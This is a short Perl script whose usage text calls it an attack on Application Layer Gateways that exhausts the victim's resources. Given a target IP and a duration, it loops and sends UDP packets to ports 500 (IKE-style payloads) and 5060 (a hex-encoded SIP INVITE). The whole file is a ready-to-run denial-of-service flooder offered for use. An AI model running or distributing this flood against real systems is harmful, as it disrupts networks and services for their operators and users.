use Socket;
use strict;
 
if ($#ARGV != 1) {
system("cls");
print "
Script created for attack (ALG aka Application Layer Gateway) causing many resources to be consumed in the victim.

Created by Echo503 and Krawk :)

Use -> perl ALG.pl <IP> <LENGTH>
";
exit(1);
}
 
my ($ip,$length) = @ARGV;
 
my ($iaddr,$endtime);

$iaddr = inet_aton("$ip") or die "Imposible atacar a $ip\n";
$endtime = time() + ($length ? $length : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
for (;time() <= $endtime;) {

	send("flood", "\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01", 0, pack_sockaddr_in("500", $iaddr));
    send("flood", "\x6e\x32\x4e\x49\x24\xf2\xbc\xbe\x00\x00\x00\x00\x00\x00\x00\x00", 0, pack_sockaddr_in("500", $iaddr));
	send("flood", "\x49\x4e\x56\x49\x54\x45\x20\x73\x69\x70\x3a\x74\x65\x73\x74\x40\x31\x30\x2e\x30\x2e\x32\x2e\x31\x35\x3a\x35\x30\x36\x30\x20\x53\x49\x50\x2f\x32\x2e\x30\x0d\x0a\x56\x69\x61\x3a\x20\x53\x49\x50\x2f\x32\x2e\x30\x2f\x55\x44\x50\x20\x31\x30\x2e\x30\x2e\x32\x2e\x32\x30\x3a\x35\x30\x36\x30\x3b\x62\x72\x61\x6e\x63\x68\x3d\x7a\x39\x68\x47\x34\x62\x4b\x2d\x32\x31\x38\x37\x2d\x31\x2d\x30\x0d\x0a\x46\x72\x6f\x6d\x3a\x20\x22\x44\x56\x49\x34\x2f\x38\x30\x30\x30\x22\x20\x3c\x73\x69\x70\x3a\x73\x69\x70\x70\x40\x31\x30\x2e\x30\x2e\x32\x2e\x32\x30\x3a\x35\x30\x36\x30\x3e\x3b\x74\x61\x67\x3d\x31\x0d\x0a\x54\x6f\x3a\x20\x74\x65\x73\x74\x20\x3c\x73\x69\x70\x3a\x74\x65\x73\x74\x40\x31\x30\x2e\x30\x2e\x32\x2e\x31\x35\x3a\x35\x30\x36\x30\x3e\x0d\x0a\x43\x61\x6c\x6c\x2d\x49\x44\x3a\x20\x31\x2d\x32\x31\x38\x37\x40\x31\x30\x2e\x30\x2e\x32\x2e\x32\x30\x0d\x0a\x43\x53\x65\x71\x3a\x20\x31\x20\x49\x4e\x56\x49\x54\x45\x0d\x0a\x43\x6f\x6e\x74\x61\x63\x74\x3a\x20\x73\x69\x70\x3a\x73\x69\x70\x70\x40\x31\x30\x2e\x30\x2e\x32\x2e\x32\x30\x3a\x35\x30\x36\x30\x0d\x0a\x4d\x61\x78\x2d\x46\x6f\x72\x77\x61\x72\x64\x73\x3a\x20\x37\x30\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x73\x64\x70\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x20\x20\x30\x0d\x0a", 0, pack_sockaddr_in("5060", $iaddr));

	};
	
	